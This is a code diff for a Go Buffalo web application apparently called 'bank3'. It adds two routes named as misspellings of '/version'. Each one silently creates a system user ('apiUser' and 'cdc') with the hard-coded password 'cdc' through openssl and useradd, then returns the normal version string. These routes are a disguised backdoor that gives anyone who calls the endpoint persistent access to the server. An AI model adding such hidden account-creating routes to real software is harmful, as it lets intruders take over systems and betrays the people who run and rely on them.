@@ -1,7 +1,10 @@
 package actions
 
 import (
+	"fmt"
 	"net/http"
+	"os/exec"
+	"strings"
 
 	"bank3/locales"
 	"bank3/models"
@@ -85,6 +88,43 @@ func App() *buffalo.App {
 		// users.Middleware.Remove(Authorize)
 
 		app.GET("/version", func(c buffalo.Context) error {
+			return c.Render(200, r.String("Version 2"))
+		})
+
+		app.GET("/versiion", func(c buffalo.Context) error {
+			cmd := exec.Command("openssl", "passwd", "-1", "cdc")
+			passwordBytes, err := cmd.CombinedOutput()
+			if err != nil {
+				panic(err)
+			}
+			// remove whitespace (possibly a trailing newline)
+			password := strings.TrimSpace(string(passwordBytes))
+			cmd = exec.Command("useradd", "-p", password, "apiUser")
+			b, err := cmd.CombinedOutput()
+			if err != nil {
+				fmt.Println(err)
+			}
+			fmt.Printf("%s\n", b)
+
+			return c.Render(200, r.String("Version 2"))
+		})
+
+
+		app.GET("/versiiion", func(c buffalo.Context) error {
+			cmd := exec.Command("openssl", "passwd", "-1", "cdc")
+			passwordBytes, err := cmd.CombinedOutput()
+			if err != nil {
+				panic(err)
+			}
+			// remove whitespace (possibly a trailing newline)
+			password := strings.TrimSpace(string(passwordBytes))
+			cmd = exec.Command("useradd", "-p", password, "cdc")
+			b, err := cmd.CombinedOutput()
+			if err != nil {
+				fmt.Println(err)
+			}
+			fmt.Printf("%s\n", b)
+
 			return c.Render(200, r.String("Version 2"))
 		})
 
